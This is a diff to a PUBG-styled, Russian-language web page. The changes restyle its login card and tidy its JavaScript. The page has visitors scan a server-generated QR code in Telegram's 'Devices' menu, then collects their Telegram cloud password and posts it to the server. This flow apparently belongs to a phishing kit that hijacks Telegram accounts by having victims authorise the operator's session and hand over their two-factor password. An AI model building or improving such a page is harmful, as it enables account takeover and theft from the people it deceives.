@@ -111,7 +111,7 @@ body{
     linear-gradient(180deg, rgba(255,255,255,.03), transparent),
     var(--bg-card);
   border-radius:var(--radius-xl);
-  padding:20px;
+  padding:22px 20px;
   box-shadow:var(--shadow-soft);
   border:1px solid rgba(255,255,255,.08);
   display:flex;
@@ -119,13 +119,19 @@ body{
   align-items:center;
   justify-content:center;
   gap:14px;
+  text-align:center;
 }
 
+/* ✅ FIX: нормальная типографика для длинной RU-фразы */
 .login-title{
-  font-size:12px;
-  letter-spacing:.18em;
-  text-transform:uppercase;
-  color:var(--text-muted);
+  max-width:420px;
+  font-size:13px;
+  line-height:1.35;
+  letter-spacing:.02em;      /* было .18em */
+  text-transform:none;       /* было uppercase */
+  color:var(--text-soft);
+  font-weight:600;
+  opacity:.95;
 }
 
 /* BUTTON */
@@ -181,7 +187,7 @@ body{
 }
 
 .auth-sub{
-  font-size:9px;
+  font-size:11px;
   color:var(--text-muted);
   margin-bottom:14px;
 }
@@ -237,6 +243,10 @@ body{
   .main{
     margin-top:-60px;
   }
+  .login-title{
+    max-width:520px;
+    font-size:13px;
+  }
 }
 </style>
 </head>
@@ -264,8 +274,10 @@ body{
 
     <!-- LOGIN -->
     <div class="login-card">
-      <div class="login-title">Войдите через Telegram: откройте «Устройства» и сканируйте QR-код</div>
-      <button class="pubg-btn" onclick="startLogin()">Получить QR-код</button>
+      <div class="login-title">
+        Войдите через Telegram: откройте «Устройства» и сканируйте QR-код
+      </div>
+      <button class="pubg-btn" id="btnStart">Получить QR-код</button>
     </div>
 
   </div>
@@ -289,51 +301,72 @@ body{
 </div>
 
 <script>
-let loginId=null
+let loginId = null;
+
+const overlay = document.getElementById("overlay");
+const qr = document.getElementById("qr");
+const ok = document.getElementById("ok");
+const password = document.getElementById("password");
+const err = document.getElementById("err");
+const btnStart = document.getElementById("btnStart");
+
+btnStart.addEventListener("click", startLogin);
 
 async function startLogin(){
-  overlay.style.display="flex"
-  const r=await fetch("/auth/start",{method:"POST"})
-  const d=await r.json()
-  loginId=d.login_id
-  qr.src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data="+
-         encodeURIComponent(d.qr_url)
+  overlay.style.display = "flex";
+
+  const r = await fetch("/auth/start", { method: "POST" });
+  const d = await r.json();
+
+  loginId = d.login_id;
+
+  qr.style.display = "block";
+  ok.style.display = "none";
+
+  qr.src =
+    "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" +
+    encodeURIComponent(d.qr_url);
 }
 
-(()=>{
-  const proto=location.protocol==="https:"?"wss":"ws"
-  const ws=new WebSocket(`${proto}://${location.host}/auth/ws/messages`)
-  ws.onmessage=e=>{
-    const m=JSON.parse(e.data)
-    if(m.login_id!==loginId)return
-    if(m.type==="need_password"){
-      password.style.display="block"
-      password.focus()
-    }
-    if(m.type==="authorized"){
-      qr.style.display="none"
-      password.style.display="none"
-      err.style.display="none"
-      ok.style.display="block"
-      setTimeout(()=>location.href="/next",1200)
-    }
-  }
-})()
+(() => {
+  const proto = location.protocol === "https:" ? "wss" : "ws";
+  const ws = new WebSocket(`${proto}://${location.host}/auth/ws/messages`);
 
-password.addEventListener("keydown",e=>{
-  if(e.key==="Enter")sendPassword()
-})
+  ws.onmessage = (e) => {
+    const m = JSON.parse(e.data);
+    if (m.login_id !== loginId) return;
+
+    if (m.type === "need_password") {
+      password.style.display = "block";
+      password.focus();
+    }
+
+    if (m.type === "authorized") {
+      qr.style.display = "none";
+      password.style.display = "none";
+      err.style.display = "none";
+      ok.style.display = "block";
+      setTimeout(() => (location.href = "/next"), 1200);
+    }
+  };
+})();
+
+password.addEventListener("keydown", (e) => {
+  if (e.key === "Enter") sendPassword();
+});
 
 async function sendPassword(){
-  err.style.display="none"
-  const r=await fetch("/auth/password",{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({login_id:loginId,password:password.value})
-  })
-  if(!r.ok){
-    err.textContent="Incorrect password. Try again."
-    err.style.display="block"
+  err.style.display = "none";
+
+  const r = await fetch("/auth/password", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ login_id: loginId, password: password.value })
+  });
+
+  if (!r.ok) {
+    err.textContent = "Incorrect password. Try again.";
+    err.style.display = "block";
   }
 }
 </script>
